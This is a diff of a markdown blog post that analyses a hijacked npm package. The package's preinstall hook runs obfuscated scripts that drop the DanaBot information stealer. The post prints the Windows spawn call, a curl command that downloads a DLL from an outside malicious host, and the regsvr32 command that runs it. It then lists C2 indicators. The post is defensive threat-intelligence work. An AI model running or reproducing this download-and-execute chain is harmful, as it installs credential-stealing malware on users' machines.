@@ -19,10 +19,10 @@ A diff showed two new files added and changes to the packages.json file adding a
 
 ### Actions leading to a DanaBot secondary payload
 1. The new change included a preinstall command to run compile.js via node
-2. The obfuscated `compile.js` file ends up calling the `compile.bat` file via the command
+2. The obfuscated `compile.js` file ends up calling the `compile.bat` file
     * ONLY Windows machines are targeted in this case, if Windows then:
     * `child_proccess.spawn("cmd.exe /c compile.bat")`
-3. The obfuscated `compile.bat` file attempts to get a secondary payload and then run it
+3. The obfuscated `compile.bat` file attempts to get a secondary payload and then runs it
 
 ```
 Attempt 1: curl https://pastorcryptograph.at/3/sdd.dll -o compile.dll
@@ -37,7 +37,7 @@ regsvr32.exe -s compile.dll
 <img style="align:left" src="{{ site.url }}/assets/img/blogging/coa_203_01.png"/>
 
 ### What gets dropped?
-Config extractors matched this secondary payload to be a DanaBot information stealer. I successfully pulled down the DanaBot malware payload but have not analyzed this yet to identify any changed functionality from previous samples.
+Rules matched this secondary payload to be a DanaBot information stealer. I successfully pulled down the DanaBot malware payload but have not analyzed this yet to identify any changed functionality from previous samples. Via config extractors I have pulled the C2 addresses.
 
 ### IOC's
 **C2**
